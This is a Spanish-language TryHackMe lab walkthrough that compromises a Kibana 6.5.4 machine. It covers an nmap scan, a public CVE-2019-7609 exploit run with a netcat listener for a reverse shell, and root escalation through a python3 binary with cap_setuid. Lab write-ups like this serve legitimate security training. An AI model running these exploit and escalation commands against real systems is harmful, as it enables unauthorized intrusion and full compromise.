Bienvenidos a otra maquina en modo facil de tryhackme. Utilizaremos nuestro reconocimiento de escaneo nmap para descubrir puertos abiertos. Usaremos esta informacion para navegar dentro de la interfaz de kiba del cual tendremos que investigar la version para luego buscar su correspondiente exploit y poder adentrarnos a su sistema. Por ultimo, escalaremos privilegios enumerando las capacidades dentro de sistema o bien podremos buscarlo manualmente para encontrar la brecha y escalar al usuario root.

# Recon
Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-01 04:58:39 EDT for 40s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE      REASON         VERSION
22/tcp   open  ssh          syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
5044/tcp open  lxi-evntsvc? syn-ack ttl 63
5601/tcp open  esmagent?    syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.80%I=7%D=7/1%Time=649FEAD9%P=x86_64-pc-linux-gnu%r(Get
SF:Request,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nkb
SF:n-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c
SF:\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\x
SF:20close\r\nDate:\x20Sat,\x2001\x20Jul\x202023\x2008:59:05\x20GMT\r\n\r\
SF:n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x2
SF:0kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\nconten
SF:t-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-c
SF:ache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Sat,\
SF:x2001\x20Jul\x202023\x2008:59:05\x20GMT\r\n\r\n{\"statusCode\":404,\"er
SF:ror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSe
SF:ssionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalSer
SF:verCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSession
SF:Req,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not\
SF:x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d0492328
SF:3ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=utf-8\r
SF:\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x2
SF:0close\r\nDate:\x20Sat,\x2001\x20Jul\x202023\x2008:59:11\x20GMT\r\n\r\n
SF:{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Fou
SF:nd\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPBi
SF:ndReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap


```

Nuestro escaneo de nmap nos muestra 4 puertos abiertos, del cual podemos navegar para poder investigar un poco mas esta maquina. Navegamos al puerto 5601 que nos movera a una interfaz kibana que es una herramienta de visualizacion y analisis de datos. http://IPTARGET:5601.

Nosotros como atacantes lo primero que tenemos que mirar es la version por la cual esta ejecutandose, si tenemos suerte y la version esta desactualizada, podemos abusarnos de esto y con suerte encontraremos un exploit.
En mi caso, yo encontre la version navegando al codigo fuente y buscando con `ctrl+f` la palabra clave `version` y nos mostrara que es una version **Kibana 6.5.4**

# Intrusion

Para empezar nuestro proceso de intrusion, tendremos que buscar el exploit correspondiente hasta encontrar el que funcione. Yo utilice este repositorio de github que contiene el exploit que me funciono para este maquina, este proceso siempre es de prueba y error hasta encontrar el que te funcione, o crearlo por tu cuenta.
https://github.com/Cr4ckC4t/cve-2019-7609

El uso es bastante sencillo, tendremos que poner la ip del servidor web con su correpondiente puerto, nuestro LHOST y LPORT. 
Antes de hacer este proceso, nos pondremos en escucha con el LPORT que eligamos.

```bash
nc -nvlp LPORT

./exploit.py http://IPTARGET:5601 LHOST LPORT
```

Una vez ejecutado, veremos que obtuvimos una respuesta exitosa y estaremos dentro del sistema como usuario kiba. 

# Priv.Escalation

Para nuestra escalada de privilegios, vamos a enumerar recursivamente las capacidades de  archivos y directorios dentro del sistema. 
Para esta tarea utilizamos `getcap -r /`. Con este comando, recibiremos demasiadas respuestas y nos va a hacer el trabajo mucho mas pesado, para corregir esto, agregaremos el siguiente patro. `getcap -r / 2>/dev/null`

Nos mostrara el siguiente archivo dentro del cual tendremos que investigar de que se trata 

`/home/kiba/.hackmeplease/python3 = cap_setuid+ep`

Como es un archivo python, le diremos que nos cambie el UID y ejecutar una shell bash  como usuario raiz root.

`./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

